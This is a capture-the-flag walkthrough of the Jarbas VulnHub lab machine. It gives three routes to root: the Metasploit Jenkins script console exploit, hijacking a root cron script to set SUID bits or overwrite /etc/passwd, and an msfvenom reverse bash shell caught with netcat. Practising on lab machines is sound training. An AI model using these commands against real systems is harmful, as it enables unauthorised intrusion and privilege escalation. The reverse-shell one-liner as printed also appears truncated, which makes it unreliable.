---
title: 'Hack the Jarbas: 1 OSCP Preparation machines'
date: 2019-11-04T19:31:00+01:00
draft: false
---

Hello readers. We’d recently tried our hands on the vulnerable VM called Jarbas on vulnhub. It is developed to look like a 90s Portuguese search engine. It is made by Tiago Tavares. You can download the lab from [here](https://www.vulnhub.com/entry/jarbas-1,232/). The objective of this challenge is to get the root shell.  
**Difficulty Level: Easy**  
**Steps involved:**  
**Method 1:**  

1.  Port scanning and network discovery.
2.  Directory enumeration.
3.  Discovery of username and password hashes.
4.  Cracking password hash.
5.  Exploiting Jenkins on port 8080 using Metasploit.
6.  Discovering cronjob.
7.  Modifying cronjob and replacing it with a custom command to set the sticky bit on the find.
8.  Waiting 5 minutes for the sticky bit to get set.
9.  Executing root command to read the flag.

**Method 2:**  

1.  Exploiting Jenkins as above to get a shell.
2.  Using OpenSSL to create a password hash.
3.  Editing /etc/passwd file with our custom file.
4.  Uploading it in the /tmp folder.
5.  Copying it in place of /etc/passwd.
6.  Logging in as root using SU binary.

**Method 3:**  

1.  Achieving meterpreter as above.
2.  Uploading a reverse\_bash one-liner in CleaningScript.sh.
3.  Activating Netcat and getting root.

Let’s get started then.  

### **Method 1:**

After running a **netdiscover** scan we figured out that the IP that DHCP allotted to the VM was 192.168.1.122 in my case.  
So, we used a nmap aggressive scan to discover opened ports on the VM.  

nmap -A 192.168.1.122

1

nmap  \-A  192.168.1.122

![](https://i2.wp.com/3.bp.blogspot.com/-lfyMAKlruEY/W11JwefMLlI/AAAAAAAAYts/yHLWblu0GCIr5GLw8LIf3W9yUrVahLpnwCLcBGAs/s1600/2.png?w=687&ssl=1)  
There was a webpage associated with the VM so we opened it in the browser.  
![](https://i1.wp.com/3.bp.blogspot.com/-xK3PlBGRxrc/W11JyzVbj-I/AAAAAAAAYuA/T0o1Zqs3pxQROjh1k1UpujgX2V47der3gCLcBGAs/s1600/3.png?w=687&ssl=1)  
When nothing seemed to impress us, we tried to enumerate the directories using directory buster.  

dirb http://192.168.1.122/ -X .html

1

dirb http://192.168.1.122/ -X .html

![](https://i2.wp.com/3.bp.blogspot.com/-7ZWq90YQLg0/W11JzRb1O-I/AAAAAAAAYuE/i6N2eV2kaJUxfzlFO_C6ZIqIh7yf8teGwCLcBGAs/s1600/4.png?w=687&ssl=1)  
Since index.html is the default page and there was another HTML page available, we tried to open it in the browser.  
![](https://i0.wp.com/4.bp.blogspot.com/-pn_RG3-5VY8/W11J0J8pXVI/AAAAAAAAYuI/Uwhd8vtdFP45KgX-QohDU2-8GxALUM0uACLcBGAs/s1600/5.png?w=687&ssl=1)  
We found some password hashes in the access.html that we tried to crack it online on **hashkiller**.  
![](https://i2.wp.com/2.bp.blogspot.com/-nuSjNHuzkbw/W11J0SbW8VI/AAAAAAAAYuM/aZlnQjX5VPYgUjshXpZj8eft06xrdZbuwCLcBGAs/s1600/6.png?w=687&ssl=1)  
WOW! We have three passwords in hand now.  
Now, remember we had port 22 open in our **nmap** scan report, so we tried to login into ssh using the usernames and passwords we just cracked but it didn’t seem to work. So, we looked at another interesting port of 8080 and opened it in the browser.  
![](https://i2.wp.com/2.bp.blogspot.com/-6w3K6AbnadU/W11J0YnSsFI/AAAAAAAAYuQ/iD8eLPWkgq8fnTxTco9pJPGd4kHYXfj0QCLcBGAs/s1600/7.png?w=687&ssl=1)  
We found a web application on Jenkins. It is an open source automation server written in Java. Jenkins helps to automate the non-human part of the software development process, with continuous integration and facilitating technical aspects of continuous delivery.  
We tried to login with all three of the usernames and passwords but the third combination logged us into Jenkins which was:  

eder: vipsu

1

eder:  vipsu

![](https://i0.wp.com/2.bp.blogspot.com/-u-vkcJxQHCo/W11J1MWjDsI/AAAAAAAAYuU/iGVNCMNjY0MSyge_IzxA7W6LytPKN2HpQCLcBGAs/s1600/8.png?w=687&ssl=1)  
Now, we found that Jenkins had a script console vulnerability and its module was in Metasploit.  

use exploit/multi/http/jenkins\_script\_console msf exploit(jenkins\_script\_console) > set target 1 msf exploit(jenkins\_script\_console) > set rhost 192.168.1.122 msf exploit(jenkins\_script\_console) > set rport 8080 msf exploit(jenkins\_script\_console) > set TARGETURI / msf exploit(jenkins\_script\_console) > set USERNAME eder msf exploit(jenkins\_script\_console) > set PASSWORD vipsu msf exploit(jenkins\_script\_console) > exploit

1

2

3

4

5

6

7

8

use  exploit/multi/http/jenkins\_script\_console

msf exploit(jenkins\_script\_console)  \>  set target  1

msf exploit(jenkins\_script\_console)  \>  set rhost  192.168.1.122

msf exploit(jenkins\_script\_console)  \>  set rport  8080

msf exploit(jenkins\_script\_console)  \>  set TARGETURI  /

msf exploit(jenkins\_script\_console)  \>  set USERNAME eder

msf exploit(jenkins\_script\_console)  \>  set PASSWORD vipsu

msf exploit(jenkins\_script\_console)  \>  exploit

![](https://i1.wp.com/1.bp.blogspot.com/-RHNt2m5scaU/W11J1zXMDDI/AAAAAAAAYuY/WHrN1mOgp7w5iG9XwHqruE52If7-1mI8QCLcBGAs/s1600/9.png?w=687&ssl=1)  
We got a meterpreter session! Let’s try and get a teletype here using python’s one-liner shell:  

shell python -c 'import pty;pty.spawn("/bin/bash");'

1

2

shell

python  \-c  'import pty;pty.spawn("/bin/bash");'

Now, we found a shell script in the crontab which was executing automatically after every 5 minutes called CleaningScript.sh and whose job was to remove access log from the system.  

cat /etc/crontab cd /etc/script ls cat CleaningScript.sh

1

2

3

4

cat  /etc/crontab

cd  /etc/script

ls

cat CleaningScript.sh

But even better, it was running with root permissions!  
![](https://i0.wp.com/4.bp.blogspot.com/-zRIazhFrQ5I/W11JuOFtazI/AAAAAAAAYtU/nAHIL74eOlQRnbIJ_e6OFEfsB66DiWpZgCLcBGAs/s1600/10.png?w=687&ssl=1)  
Let’s make a new gedit file called CleaningScript.sh and use the root privilege of CleaningScript.sh file to set a sticky bit on “find.”  

#!/bin/bash chmod u+s /usr/bin/find

1

2

#!/bin/bash

chmod  u+s  /usr/bin/find

![](https://i0.wp.com/4.bp.blogspot.com/-lHsNInCgS7g/W11JuR1SeVI/AAAAAAAAYtc/irrmFz62V208c05zhnsQ2C4-Z_fn3uuPACLcBGAs/s1600/11.png?w=687&ssl=1)  
Now, all that was left to do was to upload this new shell script onto the server and replace it with the original file.  
So, we background the shell (**CTRL+Z**)  
and used meterpreter upload command.  

upload /root/Desktop/CleaningScript.sh . shell python -c 'import pty;pty.spawn("/bin/bash");' date

1

2

3

4

upload  /root/Desktop/CleaningScript.sh  .

shell

python  \-c  'import pty;pty.spawn("/bin/bash");'

date

We observed the time and waited for exactly 5 minutes for the script to run automatically.  
![](https://i2.wp.com/1.bp.blogspot.com/-MD2Vex27QMo/W11JuTZrq0I/AAAAAAAAYtY/NDqhDyrJUmo-0G0lhUdrc-sUa__HBGCDACLcBGAs/s1600/12.png?w=687&ssl=1)  
After 5 minutes:  

ls -la /usr/bin/find

1

ls  \-la  /usr/bin/find

Permissions modified: -rwsr-xr-x  
The sticky bit got set! Now we just need to use the find inline command execution:  

find /home -exec whoami \\;

1

find  /home  \-exec whoami  \\;

As you can see all the users got enumerated as **root**.  

find /home -exec ls -la /root \\;

1

find  /home  \-exec ls  \-la  /root  \\;

Hence, we can execute any command as root now!!  
![](https://i0.wp.com/1.bp.blogspot.com/--3q1W9IdrYA/W11JvRT4hxI/AAAAAAAAYtg/ZpM4JeH0l9Ma-iuYGcErvG0KPon4DG_tQCLcBGAs/s1600/13.png?w=687&ssl=1)  
A file called flag.txt was visible in the root directory.  

find /home -exec cat flag.txt \\;

1

find  /home  \-exec cat flag.txt  \\;

![](https://i2.wp.com/4.bp.blogspot.com/-TnniS4eTvaM/W11Jv0GHhAI/AAAAAAAAYtk/cDr8sQvSfTkzVn7GBk-mC6lkc_uxndR0wCLcBGAs/s1600/14.png?w=687&ssl=1)  

### **Method 2:**

For this method, we achieve the meterpreter session as above and then get a shell.  
We used echo command this time to set the sticky bit on **/usr/bin/cp**  

echo "chmod u+s /usr/bin/cp" > CleaningScript.sh

1

echo  "chmod u+s /usr/bin/cp"  \>  CleaningScript.sh

![](https://i2.wp.com/3.bp.blogspot.com/-d8BBPUydaj4/W11JwW6xqeI/AAAAAAAAYto/4iCH6j-zojYlxQPlCdl6J7-BxQamGeuSQCLcBGAs/s1600/25.png?w=687&ssl=1)  
We read the /etc/passwd file using cat utility after that.  
![](https://i0.wp.com/1.bp.blogspot.com/-Hh2PWlkoo0s/W11Jw-KFm1I/AAAAAAAAYtw/wlDtn6LyjG8S6bhOIGOtg4hq0YaBNI7RgCLcBGAs/s1600/26.png?w=687&ssl=1)  
Our aim was to add a user in /etc/passwd file as root. So, we use OpenSSL utility to create a password hash with the command:  

openssl passwd -l -salt user3 pass123

1

openssl passwd  \-l  \-salt user3 pass123

Copy the password hash in someplace safe now.  
![](https://i2.wp.com/1.bp.blogspot.com/-lxD5UfBdrpE/W11JxSXjecI/AAAAAAAAYt0/pmr01Qhyu3ECiLC3DfdalARzEejqqJmnQCLcBGAs/s1600/27.png?w=687&ssl=1)  
Copy the /etc/passwd file in a leafpad file and let’s add our custom user in there.  

raj:$1$user3$<hash>:0:0:root:/root:/bin/bash

1

raj:$1$user3$<hash\>:0:0:root:/root:/bin/bash

![](https://i1.wp.com/4.bp.blogspot.com/-Z89YcbxkFUE/W11Jyoy5XRI/AAAAAAAAYt8/4sT3jP9vucEi0HXQVR3WUaPV06hbtlPTwCLcBGAs/s1600/28.png?w=687&ssl=1)  
Save this file somewhere on the desktop and download this file on server’s /tmp (universal writeable) directory.  
Then use cp (since we set sticky bit) to copy and replace this file with the original file with the command:  

cp passwd /etc/passwd

1

cp passwd  /etc/passwd

Let’s try and login using su binary:  

su raj \[password\]: pass123

1

2

su raj

\[password\]:  pass123

**Voila!** We got a root shell! Let’s read the flag now.  

cd /root ls cat flag.txt

1

2

3

cd  /root

ls

cat flag.txt

![](https://i2.wp.com/4.bp.blogspot.com/-c1ypzYDZn_k/W11Jyay_VnI/AAAAAAAAYt4/si0bXYb1-mQT1W9sgbkpoZR-H_Uh6q8sQCLcBGAs/s1600/29.png?w=687&ssl=1)  

### **Method 3:**

Achieve shell as above and in another terminal window, try this msfvenom command:

msfvenom -p cmd/unix/reverse\_bash lhost=192.168.1.133 lport=4444 R

1

msfvenom  \-p  cmd/unix/reverse\_bash lhost\=192.168.1.133  lport\=4444  R

![](https://i1.wp.com/3.bp.blogspot.com/-3d3ZwAES0lc/W17UGcb1jBI/AAAAAAAAYyk/J6EiAM5YxbkKJfBR-5ckTkc82VQbQc_mQCLcBGAs/s1600/30.png?w=687&ssl=1)

Since we know CleaningScript.sh is run as root in every 5 minutes, so we copy this one-liner in CleaningScript.sh and activate a netcat shell side by side and wait for 5 minutes.  

cd /etc/script ls echo "0<&126 >&126 2>&126" > CleaningScript.sh

1

2

3

cd  /etc/script

ls

echo  "0<&126 >&126 2>&126"  \>  CleaningScript.sh

![](https://i0.wp.com/3.bp.blogspot.com/-2Ksu-yrKjRo/W17UGfojUJI/AAAAAAAAYyo/O-qrCMThJ70lFqcQZG6QgFPSq7WUz4-DwCLcBGAs/s1600/31.png?w=687&ssl=1)

In another window, after waiting for 5 minutes, we will get a root shell!  

nc -lvp 4444 id python -c 'import pty;pty.spawn("/bin/bash");' cat flag.txt

1

2

3

4

nc  \-lvp  4444

id

python \-c  'import pty;pty.spawn("/bin/bash");'

cat flag.txt

![](https://i2.wp.com/3.bp.blogspot.com/-xaJgB_J4gUY/W17UGHjVgEI/AAAAAAAAYyg/wWLs7qVa9LYrxIEB7L_l3KyBoDJWxq5OgCLcBGAs/s1600/32.png?w=687&ssl=1)

So, that’s how we captured the flag in this VM. Happy Hacking.